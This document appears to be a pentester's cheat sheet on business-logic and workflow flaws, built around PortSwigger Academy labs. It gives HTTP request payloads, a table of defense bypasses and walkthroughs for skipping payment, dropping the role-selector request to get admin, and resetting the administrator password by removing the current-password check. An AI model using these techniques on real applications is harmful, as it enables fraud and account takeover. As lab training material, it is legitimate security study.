# Business logic - Workflow and state machine flaws

Developers assume users follow the intended workflow in the expected order. Attackers can skip steps (replay order-confirmation without paying), drop requests (skip role-selector to get default admin role), remove parameters (no current-password check), or change context after passing validation (register legit, then change email to @privileged.com).

## Quick reference
```
# Skip payment step
GET /cart/order-confirmation?order-confirmation=true   (replay without completing checkout)

# Drop role-selector request
login -> intercept GET /role-selector -> DROP it -> browse / -> role defaults to admin

# Remove current-password to change admin password
POST /my-account/change-password
  username=administrator&new-password-1=hacked&new-password-2=hacked
  (current-password param removed entirely)

# Email-change post-registration to gain privileged domain
register@anything.com  ->  login  ->  "My account" -> change email to anything@dontwannacry.com
```

## Root cause
Application enforces security checks at one step but trusts the downstream state without re-validating. Steps are linked by redirects/GET params, not server-side session flags. Removing a request or replaying a later step skips enforcement.

## Find it
1. Map the entire workflow in proxy history (add -> checkout -> confirm -> pay).
2. Try replaying the confirmation/success request directly without completing earlier steps.
3. Look for multi-step processes where one step sets a GET param (`order-confirmation=true`) - try sending it without the step that should precede it.
4. On any auth flow, try dropping intermediate requests (role-selector, 2FA page) - does the server default to a privileged state?
5. On password-change / profile-update endpoints, remove each parameter one at a time - does `current-password` absence still work?
6. After registration, look for a "Change email" feature - can you switch to a restricted domain?

## Technique
**Skip payment / insufficient workflow validation:**
1. Buy any cheap item (affordable with store credit) -> study the proxy history.
2. Note `POST /cart/checkout` redirects to `GET /cart/order-confirmation?order-confirmation=true`.
3. Send that GET to Repeater.
4. Add the expensive item to cart.
5. Send the saved `GET /cart/order-confirmation?order-confirmation=true` -> order placed without payment.

**Flawed state machine (drop role-selector):**
1. Log in; intercept `GET /role-selector` -> DROP it.
2. Navigate to `/` or `/admin` directly.
3. Server has no role set -> defaults to administrator.

**Weak isolation on dual-use endpoint:**
1. Log in, go to account page, change password - intercept `POST /my-account/change-password`.
2. Remove `current-password` param entirely from the request.
3. Set `username=administrator`.
4. Send -> password changes for administrator without knowing current password.
5. Log out -> log in as administrator.

**Inconsistent security controls (email change):**
1. Register with any `@your-email.web-security-academy.net` address.
2. Log in -> My Account -> change email to `anything@dontwannacry.com`.
3. No re-validation -> now treated as a DontWannaCry employee -> /admin access.

## Payload arsenal
```http
# Insufficient workflow validation
GET /cart/order-confirmation?order-confirmation=true HTTP/1.1

# Weak isolation - change admin password (no current-password)
POST /my-account/change-password HTTP/1.1
username=administrator&new-password-1=hacked&new-password-2=hacked

# Drop role-selector in Burp Proxy > Intercept
GET /role-selector HTTP/1.1   <- DROP this request

# After-registration email change
POST /my-account/change-email
email=attacker%40dontwannacry.com
```

## Bypasses
| Defense | Bypass |
|---|---|
| Payment enforced by checkout flow | Replay order-confirmation GET directly |
| Role assigned at login | Drop the role-selector request -> default = admin |
| current-password required on change | Remove the parameter -> server skips check |
| Restricted domain at registration | Register legit -> change email after login |

## Exploitation walkthrough
**Insufficient workflow validation:**
1. Buy cheap item -> note GET /cart/order-confirmation?order-confirmation=true -> send to Repeater.
2. Add leather jacket to cart.
3. Replay the saved GET -> solved (jacket ordered, no credit deducted).

**Flawed state machine:**
1. Turn on Burp intercept -> log in -> forward POST /login -> intercept GET /role-selector -> DROP.
2. Browse to / -> logged in as admin (role defaulted) -> /admin -> delete carlos.

**Weak isolation:**
1. Intercept POST /my-account/change-password -> remove `current-password` -> set `username=administrator` -> send.
2. Log out -> log in as administrator with new password -> /admin -> delete carlos.

**Inconsistent security controls:**
1. Discover /admin via content discovery.
2. Register with @your-email-id.web-security-academy.net.
3. Log in -> My Account -> change email to anything@dontwannacry.com.
4. /admin -> delete carlos.

## Chaining
- Workflow skip + [Client-side-controls](../Client-side-controls/) tamper -> buy anything free.
- Admin password change -> full account takeover -> [Access-control](../../Access-control/).
- Email change -> admin panel -> [Authentication](../../Authentication/) (admin = all users visible).

## Tools
- **Burp Proxy Intercept** - drop individual requests
- **Burp Repeater** - replay order-confirmation / change-password with modified params
- **Burp content discovery** - find /admin path

## Labs

### Inconsistent security controls [Apprentice]
Register with legit email -> log in -> My Account -> change email to @dontwannacry.com -> /admin access. Key insight: registration enforces domain; email-change feature doesn't re-validate.

### Insufficient workflow validation [Practitioner]
Buy cheap item -> save `GET /cart/order-confirmation?order-confirmation=true` in Repeater -> add jacket -> replay saved GET -> jacket ordered free. Key insight: order confirmation is just a GET param, no server-side payment lock.

### Authentication bypass via flawed state machine [Practitioner]
Log in -> DROP `GET /role-selector` in Burp -> browse to / -> admin role assigned by default. Key insight: server assigns a default role when role-selector is skipped - and that default is admin.

### Weak isolation on dual-use endpoint [Practitioner]
POST /my-account/change-password -> remove `current-password` param + set `username=administrator` -> admin password changed without knowing it. Key insight: same endpoint handles all users; current-password check is skipped when param is absent.

## Real-world notes
- Always replay "success/confirmation" endpoints directly - workflow sequence is rarely enforced server-side.
- Try dropping each step in every multi-step process (2FA, role selection, cart validation).
- Password-change endpoints with optional current-password are extremely common in real apps.
- Post-registration email change bypassing domain restrictions is a classic privilege escalation path.

## References
- https://portswigger.net/web-security/logic-flaws/examples#making-flawed-assumptions-about-user-behavior
